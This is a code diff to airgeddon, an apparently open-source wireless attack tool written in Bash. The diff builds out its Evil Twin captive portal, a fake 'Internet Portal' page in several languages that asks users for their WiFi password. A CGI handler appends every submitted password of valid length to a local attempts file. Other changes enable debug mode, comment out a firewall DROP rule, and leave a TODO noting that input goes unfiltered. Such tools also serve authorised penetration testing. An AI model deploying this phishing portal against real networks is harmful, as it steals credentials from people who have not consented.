@@ -3,7 +3,7 @@
 airgeddon_version="4.3"
 
 #Enabled 1 / Disabled 0 - Debug mode for faster development skipping intro and initial checks - Default value 0
-debug_mode=0
+debug_mode=1
 
 #Enabled 1 / Disabled 0 - Auto update feature (it has no effect on debug mode) - Default value 1
 auto_update=1
@@ -112,7 +112,7 @@ pending_of_translation="[PoT]"
 escaped_pending_of_translation="\[PoT\]"
 standard_resolution="1024x768"
 
-#Dhcpd and Hostapd vars
+#Dhcpd, Hostapd and misc Evil Twin vars
 ip_range="192.168.1.0"
 alt_ip_range="172.16.250.0"
 router_ip="192.168.1.1"
@@ -139,6 +139,7 @@ indexfile="index.htm"
 checkfile="check.htm"
 cssfile="portal.css"
 jsfile="portal.js"
+attemptsfile="ag.et_attempts.txt"
 possible_dhcp_leases_files=(
 							"/var/lib/dhcp/dhcpd.leases"
 							"/var/state/dhcp/dhcpd.leases"
@@ -329,7 +330,7 @@ function language_strings() {
 
 	et_misc_texts["english",10]="Enter your wireless network password to get internet access"
 	et_misc_texts["spanish",10]="Introduzca su contraseña de acceso a la red inalámbrica para poder acceder a internet"
-	et_misc_texts["french",10]="Entrez votre accès d'aile de mot de passe du réseau sans fil d&#39;accès à internet"
+	et_misc_texts["french",10]="Entrez votre accès d&#39;aile de mot de passe du réseau sans fil d&#39;accès à internet"
 	et_misc_texts["catalan",10]="Introduïu la contrasenya d&#39;accés ala xarxa sense fils per poder accedir a internet"
 	et_misc_texts["portuguese",10]="Digite sua senha de acesso de rede asa sem fio para acesso à internet"
 	et_misc_texts["russian",10]="Введите свой беспроводной доступ к сети Интернет доступа пароль крыло"
@@ -358,6 +359,30 @@ function language_strings() {
 	et_misc_texts["portuguese",13]="Enviar"
 	et_misc_texts["russian",13]="послать"
 	et_misc_texts["greek",13]="Υποτάσσομαι"
+
+	et_misc_texts["english",14]="An unexpected error occurred, redirecting to the main screen"
+	et_misc_texts["spanish",14]="Ha ocurrido un error inesperado, redirigiendo a la pantalla principal"
+	et_misc_texts["french",14]="Une erreur inattendue est survenue, la redirection vers l&#39;écran principal"
+	et_misc_texts["catalan",14]="Hi ha hagut un error inesperat, redirigint a la pantalla principal"
+	et_misc_texts["portuguese",14]="Ocorreu um erro inesperado, redirecionando para a tela principal"
+	et_misc_texts["russian",14]="Произошла неожиданная ошибка, перенаправлять на главный экран"
+	et_misc_texts["greek",14]="Παρουσιάστηκε μη αναμενόμενο σφάλμα, τον αναπροσανατολισμό προς την κύρια οθόνη"
+
+	et_misc_texts["english",15]="Internet Portal"
+	et_misc_texts["spanish",15]="Portal de Internet"
+	et_misc_texts["french",15]="Portail Internet"
+	et_misc_texts["catalan",15]="Portal d&#39;Internet"
+	et_misc_texts["portuguese",15]="Portal Internet"
+	et_misc_texts["russian",15]="Интернет-портал"
+	et_misc_texts["greek",15]="Διαδικτυακή πύλη"
+
+	et_misc_texts["english",16]="The password must be at least 8 characters"
+	et_misc_texts["spanish",16]="La contraseña debe tener al menos 8 caracteres"
+	et_misc_texts["french",16]="Le mot de passe doit être d'au moins 8 caractères"
+	et_misc_texts["catalan",16]="La contrasenya ha de tenir almenys 8 caràcters"
+	et_misc_texts["portuguese",16]="A senha deve ter pelo menos 8 caracteres"
+	et_misc_texts["russian",16]="Пароль должен быть не менее 8 символов"
+	et_misc_texts["greek",16]="Ο κωδικός πρόσβασης πρέπει να είναι τουλάχιστον 8 χαρακτήρες"
 
 	declare -A arr
 	arr["english",0]="This interface $interface is already in managed mode"
@@ -2097,7 +2122,7 @@ function language_strings() {
 	arr["greek",216]="Δεν βρέθηκαν δίκτυα με Χειραψία στο επιλεγμένο αρχείο"
 
 	arr["english",217]="Only one valid target detected on file. BSSID autoselected ["${normal_color}"$bssid"${blue_color}"]"
-	arr["spanish",217]="Sólo un objetivo valido detectado en el fichero. Se ha seleccionado automáticamente el BSSID ["${normal_color}"$bssid"${blue_color}"]"
+	arr["spanish",217]="Sólo un objetivo válido detectado en el fichero. Se ha seleccionado automáticamente el BSSID ["${normal_color}"$bssid"${blue_color}"]"
 	arr["french",217]="Le seul réseau valide présent dans le fichier choisi a été sélectionné automatiquement, son BSSID est ["${normal_color}"$bssid"${blue_color}"]"
 	arr["catalan",217]="Només un objectiu vàlid detectat en el fitxer. S'ha seleccionat automàticament el BSSID ["${normal_color}"$bssid"${blue_color}"]"
 	arr["portuguese",217]="$pending_of_translation Apenas um valido objetivo detectado no arquivo. É selecionado automaticamente BSSID ["${normal_color}"$bssid"${blue_color}"]"
@@ -4742,6 +4767,7 @@ function set_captive_portal_language() {
 	language_strings ${language} 116
 	language_strings ${language} 249
 	language_strings ${language} 308
+	language_strings ${language} 320
 	print_hint ${current_menu}
 
 	read captive_portal_language_selected
@@ -5171,7 +5197,7 @@ function set_std_internet_routing_rules() {
 
 	iptables -t nat -A POSTROUTING -o ${internet_interface} -j MASQUERADE
 	iptables -A INPUT -p icmp --icmp-type 8 -s ${et_ip_range}/${std_c_mask} -d ${et_ip_router}/${ip_mask} -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
-	iptables -A INPUT -s ${et_ip_range}/${std_c_mask} -d ${et_ip_router}/${ip_mask} -j DROP
+	#iptables -A INPUT -s ${et_ip_range}/${std_c_mask} -d ${et_ip_router}/${ip_mask} -j DROP
 	sleep 2
 }
 
@@ -5359,82 +5385,98 @@ function set_captive_portal_page() {
 	mkdir "$tmpdir$webdir" > /dev/null 2>&1
 
 	echo -e "body * {" > "$tmpdir$webdir$cssfile"
-	echo -e "box-sizing: border-box;" >> "$tmpdir$webdir$cssfile"
-	echo -e "font-family: Helvetica, Arial, sans-serif;" >> "$tmpdir$webdir$cssfile"
-	echo -e "}" >> "$tmpdir$webdir$cssfile"
+	echo -e "\tbox-sizing: border-box;" >> "$tmpdir$webdir$cssfile"
+	echo -e "\tfont-family: Helvetica, Arial, sans-serif;" >> "$tmpdir$webdir$cssfile"
+	echo -e "}\n" >> "$tmpdir$webdir$cssfile"
 	echo -e ".button {" >> "$tmpdir$webdir$cssfile"
-	echo -e "color: #ffffff;" >> "$tmpdir$webdir$cssfile"
-	echo -e "background-color: #1b5e20;" >> "$tmpdir$webdir$cssfile"
-	echo -e "border-radius: 5px;" >> "$tmpdir$webdir$cssfile"
-	echo -e "cursor: pointer;" >> "$tmpdir$webdir$cssfile"
-	echo -e "height: 30px;" >> "$tmpdir$webdir$cssfile"
-	echo -e "}" >> "$tmpdir$webdir$cssfile"
+	echo -e "\tcolor: #ffffff;" >> "$tmpdir$webdir$cssfile"
+	echo -e "\tbackground-color: #1b5e20;" >> "$tmpdir$webdir$cssfile"
+	echo -e "\tborder-radius: 5px;" >> "$tmpdir$webdir$cssfile"
+	echo -e "\tcursor: pointer;" >> "$tmpdir$webdir$cssfile"
+	echo -e "\theight: 30px;" >> "$tmpdir$webdir$cssfile"
+	echo -e "}\n" >> "$tmpdir$webdir$cssfile"
 	echo -e ".content {" >> "$tmpdir$webdir$cssfile"
-	echo -e "width: 100%;" >> "$tmpdir$webdir$cssfile"
-	echo -e "background-color: #43a047;" >> "$tmpdir$webdir$cssfile"
-	echo -e "padding: 20px;" >> "$tmpdir$webdir$cssfile"
-	echo -e "margin: 15px auto 0;" >> "$tmpdir$webdir$cssfile"
-	echo -e "border-radius: 15px;" >> "$tmpdir$webdir$cssfile"
-	echo -e "color: #ffffff;" >> "$tmpdir$webdir$cssfile"
-	echo -e "}" >> "$tmpdir$webdir$cssfile"
+	echo -e "\twidth: 100%;" >> "$tmpdir$webdir$cssfile"
+	echo -e "\tbackground-color: #43a047;" >> "$tmpdir$webdir$cssfile"
+	echo -e "\tpadding: 20px;" >> "$tmpdir$webdir$cssfile"
+	echo -e "\tmargin: 15px auto 0;" >> "$tmpdir$webdir$cssfile"
+	echo -e "\tborder-radius: 15px;" >> "$tmpdir$webdir$cssfile"
+	echo -e "\tcolor: #ffffff;" >> "$tmpdir$webdir$cssfile"
+	echo -e "}\n" >> "$tmpdir$webdir$cssfile"
 	echo -e ".title {" >> "$tmpdir$webdir$cssfile"
-	echo -e "text-align: center;" >> "$tmpdir$webdir$cssfile"
-	echo -e "margin-bottom: 15px;" >> "$tmpdir$webdir$cssfile"
-	echo -e "}" >> "$tmpdir$webdir$cssfile"
+	echo -e "\ttext-align: center;" >> "$tmpdir$webdir$cssfile"
+	echo -e "\tmargin-bottom: 15px;" >> "$tmpdir$webdir$cssfile"
+	echo -e "}\n" >> "$tmpdir$webdir$cssfile"
 	echo -e "#password {" >> "$tmpdir$webdir$cssfile"
-	echo -e "width: 100%;" >> "$tmpdir$webdir$cssfile"
-	echo -e "margin-bottom: 5px;" >> "$tmpdir$webdir$cssfile"
-	echo -e "border-radius: 5px;" >> "$tmpdir$webdir$cssfile"
-	echo -e "height: 30px;" >> "$tmpdir$webdir$cssfile"
-	echo -e "}" >> "$tmpdir$webdir$cssfile"
+	echo -e "\twidth: 100%;" >> "$tmpdir$webdir$cssfile"
+	echo -e "\tmargin-bottom: 5px;" >> "$tmpdir$webdir$cssfile"
+	echo -e "\tborder-radius: 5px;" >> "$tmpdir$webdir$cssfile"
+	echo -e "\theight: 30px;" >> "$tmpdir$webdir$cssfile"
+	echo -e "}\n" >> "$tmpdir$webdir$cssfile"
 	echo -e "#password:hover," >> "$tmpdir$webdir$cssfile"
 	echo -e "#password:focus {" >> "$tmpdir$webdir$cssfile"
-	echo -e "box-shadow: 0 0 10px #69f0ae;" >> "$tmpdir$webdir$cssfile"
-	echo -e "}" >> "$tmpdir$webdir$cssfile"
+	echo -e "\tbox-shadow: 0 0 10px #69f0ae;" >> "$tmpdir$webdir$cssfile"
+	echo -e "}\n" >> "$tmpdir$webdir$cssfile"
 	echo -e ".bold {" >> "$tmpdir$webdir$cssfile"
-	echo -e "font-weight: bold;" >> "$tmpdir$webdir$cssfile"
-	echo -e "}" >> "$tmpdir$webdir$cssfile"
+	echo -e "\tfont-weight: bold;" >> "$tmpdir$webdir$cssfile"
+	echo -e "}\n" >> "$tmpdir$webdir$cssfile"
 	echo -e "#showpass {" >> "$tmpdir$webdir$cssfile"
-	echo -e "vertical-align: top;" >> "$tmpdir$webdir$cssfile"
-	echo -e "}" >> "$tmpdir$webdir$cssfile"
+	echo -e "\tvertical-align: top;" >> "$tmpdir$webdir$cssfile"
+	echo -e "}\n" >> "$tmpdir$webdir$cssfile"
 
-	echo -e "(function() {" > "$tmpdir$webdir$jsfile"
-	echo -e "var onLoad = function() {" >> "$tmpdir$webdir$jsfile"
-	echo -e "var password = document.getElementById(\"password\");" >> "$tmpdir$webdir$jsfile"
-	echo -e "var showpass = function() {" >> "$tmpdir$webdir$jsfile"
-	echo -e "password.setAttribute(\"type\", password.type == \"text\" ? \"password\" : \"text\");" >> "$tmpdir$webdir$jsfile"
-	echo -e "}" >> "$tmpdir$webdir$jsfile"
-	echo -e "document.getElementById(\"showpass\").addEventListener(\"click\", showpass);" >> "$tmpdir$webdir$jsfile"
-	echo -e "document.getElementById(\"showpass\").checked = false;" >> "$tmpdir$webdir$jsfile"
-	echo -e "};" >> "$tmpdir$webdir$jsfile"
-	echo -e "document.readyState != 'loading' ? onLoad() : document.addEventListener('DOMContentLoaded', onLoad);" >> "$tmpdir$webdir$jsfile"
-	echo -e "})();" >> "$tmpdir$webdir$jsfile"
+	echo -e "(function() {\n" > "$tmpdir$webdir$jsfile"
+	echo -e "\tvar onLoad = function() {" >> "$tmpdir$webdir$jsfile"
+	echo -e "\t\tvar formElement = document.getElementById(\"loginform\");" >> "$tmpdir$webdir$jsfile"
+	echo -e "\t\tif (formElement != null) {" >> "$tmpdir$webdir$jsfile"
+	echo -e "\t\t\tvar password = document.getElementById(\"password\");" >> "$tmpdir$webdir$jsfile"
+	echo -e "\t\t\tvar showpass = function() {" >> "$tmpdir$webdir$jsfile"
+	echo -e "\t\t\t\tpassword.setAttribute(\"type\", password.type == \"text\" ? \"password\" : \"text\");" >> "$tmpdir$webdir$jsfile"
+	echo -e "\t\t\t}" >> "$tmpdir$webdir$jsfile"
+	echo -e "\t\t\tdocument.getElementById(\"showpass\").addEventListener(\"click\", showpass);" >> "$tmpdir$webdir$jsfile"
+	echo -e "\t\t\tdocument.getElementById(\"showpass\").checked = false;\n" >> "$tmpdir$webdir$jsfile"
+	echo -e "\t\t\tvar validatepass = function() {" >> "$tmpdir$webdir$jsfile"
+	echo -e "\t\t\t\tif (password.value.length < 8) {" >> "$tmpdir$webdir$jsfile"
+	echo -e "\t\t\t\t\talert(\"${et_misc_texts[$captive_portal_language,16]}\");" >> "$tmpdir$webdir$jsfile"
+	echo -e "\t\t\t\t}" >> "$tmpdir$webdir$jsfile"
+	echo -e "\t\t\t\telse {" >> "$tmpdir$webdir$jsfile"
+	echo -e "\t\t\t\t\tformElement.submit();" >> "$tmpdir$webdir$jsfile"
+	echo -e "\t\t\t\t}" >> "$tmpdir$webdir$jsfile"
+	echo -e "\t\t\t}" >> "$tmpdir$webdir$jsfile"
+	echo -e "\t\t\tdocument.getElementById(\"formbutton\").addEventListener(\"click\", validatepass);" >> "$tmpdir$webdir$jsfile"
+	echo -e "\t\t}" >> "$tmpdir$webdir$jsfile"
+	echo -e "\t};\n" >> "$tmpdir$webdir$jsfile"
+	echo -e "\tdocument.readyState != 'loading' ? onLoad() : document.addEventListener('DOMContentLoaded', onLoad);" >> "$tmpdir$webdir$jsfile"
+	echo -e "})();\n" >> "$tmpdir$webdir$jsfile"
+	echo -e "function redirect() {" >> "$tmpdir$webdir$jsfile"
+	echo -e "\tdocument.location = \"$indexfile\";" >> "$tmpdir$webdir$jsfile"
+	echo -e "}\n" >> "$tmpdir$webdir$jsfile"
 
 	echo -e "#!/bin/bash" > "$tmpdir$webdir$indexfile"
+	echo -e 'Content-type: text/html\n' >> "$tmpdir$webdir$indexfile"
 	echo -e "echo '<!DOCTYPE html>'" >> "$tmpdir$webdir$indexfile"
 	echo -e "echo '<html>'" >> "$tmpdir$webdir$indexfile"
-	echo -e "echo '<head>'" >> "$tmpdir$webdir$indexfile"
-	echo -e "echo '<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"/>'" >> "$tmpdir$webdir$indexfile"
-	echo -e "echo '<title>Internet</title>'" >> "$tmpdir$webdir$indexfile"
-	echo -e "echo '<link rel=\"stylesheet\" type=\"text/css\" href=\"$cssfile\"/>'" >> "$tmpdir$webdir$indexfile"
-	echo -e "echo '<script type=\"text/javascript\" src=\"$jsfile\"></script>'" >> "$tmpdir$webdir$indexfile"
-	echo -e "echo '</head>'" >> "$tmpdir$webdir$indexfile"
-	echo -e "echo '<body>'" >> "$tmpdir$webdir$indexfile"
-	echo -e "echo '<div class=\"content\">'" >> "$tmpdir$webdir$indexfile"
-	echo -e "echo '<form method=\"post\" name=\"loginform\" action=\"check.htm\">'" >> "$tmpdir$webdir$indexfile"
-	echo -e "echo '<div class=\"title\">'" >> "$tmpdir$webdir$indexfile"
-	echo -e "echo '<p>${et_misc_texts[$captive_portal_language,9]}</p>'" >> "$tmpdir$webdir$indexfile"
-	echo -e "echo '<span class=\"bold\">$essid</span>'" >> "$tmpdir$webdir$indexfile"
-	echo -e "echo '</div>'" >> "$tmpdir$webdir$indexfile"
-	echo -e "echo '<p>${et_misc_texts[$captive_portal_language,10]}</p>'" >> "$tmpdir$webdir$indexfile"
-	echo -e "echo '<label>'" >> "$tmpdir$webdir$indexfile"
-	echo -e "echo '<input id=\"password\" type=\"password\" name=\"password\" maxlength=\"63\" size=\"20\" placeholder=\"${et_misc_texts[$captive_portal_language,11]}\"/><br/>'" >> "$tmpdir$webdir$indexfile"
-	echo -e "echo '</label>'" >> "$tmpdir$webdir$indexfile"
-	echo -e "echo '<p>${et_misc_texts[$captive_portal_language,12]} <input type=\"checkbox\" id=\"showpass\"/></p>'" >> "$tmpdir$webdir$indexfile"
-	echo -e "echo '<input class=\"button\" type=\"submit\" value=\"${et_misc_texts[$captive_portal_language,13]}\"/>'" >> "$tmpdir$webdir$indexfile"
-	echo -e "echo '</form>'" >> "$tmpdir$webdir$indexfile"
-	echo -e "echo '</div>'" >> "$tmpdir$webdir$indexfile"
-	echo -e "echo '</body>'" >> "$tmpdir$webdir$indexfile"
+	echo -e "echo -e '\t<head>'" >> "$tmpdir$webdir$indexfile"
+	echo -e "echo -e '\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"/>'" >> "$tmpdir$webdir$indexfile"
+	echo -e "echo -e '\t\t<title>${et_misc_texts[$captive_portal_language,15]}</title>'" >> "$tmpdir$webdir$indexfile"
+	echo -e "echo -e '\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"$cssfile\"/>'" >> "$tmpdir$webdir$indexfile"
+	echo -e "echo -e '\t\t<script type=\"text/javascript\" src=\"$jsfile\"></script>'" >> "$tmpdir$webdir$indexfile"
+	echo -e "echo -e '\t</head>'" >> "$tmpdir$webdir$indexfile"
+	echo -e "echo -e '\t<body>'" >> "$tmpdir$webdir$indexfile"
+	echo -e "echo -e '\t\t<div class=\"content\">'" >> "$tmpdir$webdir$indexfile"
+	echo -e "echo -e '\t\t\t<form method=\"post\" id=\"loginform\" name=\"loginform\" action=\"check.htm\">'" >> "$tmpdir$webdir$indexfile"
+	echo -e "echo -e '\t\t\t\t<div class=\"title\">'" >> "$tmpdir$webdir$indexfile"
+	echo -e "echo -e '\t\t\t\t\t<p>${et_misc_texts[$captive_portal_language,9]}</p>'" >> "$tmpdir$webdir$indexfile"
+	echo -e "echo -e '\t\t\t\t\t<span class=\"bold\">$essid</span>'" >> "$tmpdir$webdir$indexfile"
+	echo -e "echo -e '\t\t\t\t</div>'" >> "$tmpdir$webdir$indexfile"
+	echo -e "echo -e '\t\t\t\t<p>${et_misc_texts[$captive_portal_language,10]}</p>'" >> "$tmpdir$webdir$indexfile"
+	echo -e "echo -e '\t\t\t\t<label>'" >> "$tmpdir$webdir$indexfile"
+	echo -e "echo -e '\t\t\t\t\t<input id=\"password\" type=\"password\" name=\"password\" maxlength=\"63\" size=\"20\" placeholder=\"${et_misc_texts[$captive_portal_language,11]}\"/><br/>'" >> "$tmpdir$webdir$indexfile"
+	echo -e "echo -e '\t\t\t\t</label>'" >> "$tmpdir$webdir$indexfile"
+	echo -e "echo -e '\t\t\t\t<p>${et_misc_texts[$captive_portal_language,12]} <input type=\"checkbox\" id=\"showpass\"/></p>'" >> "$tmpdir$webdir$indexfile"
+	echo -e "echo -e '\t\t\t\t<input class=\"button\" id=\"formbutton\" type=\"button\" value=\"${et_misc_texts[$captive_portal_language,13]}\"/>'" >> "$tmpdir$webdir$indexfile"
+	echo -e "echo -e '\t\t\t</form>'" >> "$tmpdir$webdir$indexfile"
+	echo -e "echo -e '\t\t</div>'" >> "$tmpdir$webdir$indexfile"
+	echo -e "echo -e '\t</body>'" >> "$tmpdir$webdir$indexfile"
 	echo -e "echo '</html>'" >> "$tmpdir$webdir$indexfile"
 	echo -e "exit 0" >> "$tmpdir$webdir$indexfile"
 
@@ -5442,39 +5484,57 @@ function set_captive_portal_page() {
 
 	cat >&6 <<-EOF
 		#!/bin/bash
-		#POST_DATA=$(cat /dev/stdin)
+		echo -e 'Content-type: text/html\n'
 		echo '<!DOCTYPE html>'
 		echo '<html>'
-		echo '<head>'
-		echo '<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
-		echo '<title>Internet</title>'
-		echo '<link rel="stylesheet" type="text/css" href="${cssfile}"/>'
-		echo '<script type="text/javascript" src="${jsfile}"></script>'
-		echo '</head>'
-		echo '<body>'
+		echo -e '\t<head>'
+		echo -e '\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
+		echo -e '\t\t<title>${et_misc_texts[$captive_portal_language,15]}</title>'
+		echo -e '\t\t<link rel="stylesheet" type="text/css" href="${cssfile}"/>'
+		echo -e '\t\t<script type="text/javascript" src="${jsfile}"></script>'
+		echo -e '\t</head>'
+		echo -e '\t<body>'
+		echo -e '\t\t<div class="content">'
+		echo -e '\t\t\t<center><p>'
+	EOF
+
+	#TODO filter <>&*?./ chars to prevent hacker attacks
+	#maybe | sed -r "s/[<>*/&?.'\"]+//g"
+	cat >&6 <<-'EOF'
+		POST_DATA=$(cat /dev/stdin)
+		[[ "$REQUEST_METHOD" = "POST" ]] && [[ ${CONTENT_LENGTH} -gt 0 ]] && [[ ${POST_DATA} =~ ^password=(.*)$ ]] && password="${BASH_REMATCH[1]}"
+		if [[ ${#password} -ge 8 ]] && [[ ${#password} -le 63 ]]; then
+			echo "${password}" >> \
+	EOF
+
+	cat >&6 <<-EOF
+			"${tmpdir}${webdir}${attemptsfile}"
+			et_successful=1
+		else
+			echo '${et_misc_texts[$captive_portal_language,14]}'
+			et_successful=0
+		fi
+	EOF
+
+	cat >&6 <<-EOF
+		echo -e '\t\t\t</p></center>'
+		echo -e '\t\t</div>'
+		echo -e '\t</body>'
+		echo '</html>'
 	EOF
 
 	cat >&6 <<-'EOF'
-		#if [ "$REQUEST_METHOD" = "POST" ]; then
-		#	if [ "$CONTENT_LENGTH" -gt 0 ]; then
-		#		read -n $CONTENT_LENGTH POST_DATA <&0
-		#	fi
-		#fi
-		if [ "${REQUEST_METHOD}" = "POST" ] && [ ! -z "${CONTENT_LENGTH}" ]; then
-			read -n ${CONTENT_LENGTH} POST_DATA
+		if [ ${et_successful} -eq 1 ]; then
+			exit 0
+		else
+			echo '<script type="text/javascript">'
+			echo -e '\tsetTimeout("redirect()", 3500);'
+			echo '</script>'
+			exit 1
 		fi
-		echo "1. $POST_DATA"
-		[[ "$REQUEST_METHOD" = "POST" ]] && [[ ${CONTENT_LENGTH} -gt 0 ]] && [[ ${POST_DATA} =~ ^password=(.*)$ ]] && password="${BASH_REMATCH[1]}"
-		[[ -n ${password} ]] && echo 'Test. Reading POST<br/>' && echo $password
-		[[ -z ${password} ]] && echo 'An error happened' && exit 1
-		echo '</body>'
-		echo '</html>'
-		exit 0
 	EOF
 
 	exec 6>&-
-	#TODO filter <>&*?./ chars to prevent hacker attacks
-
 	sleep 3
 }
 
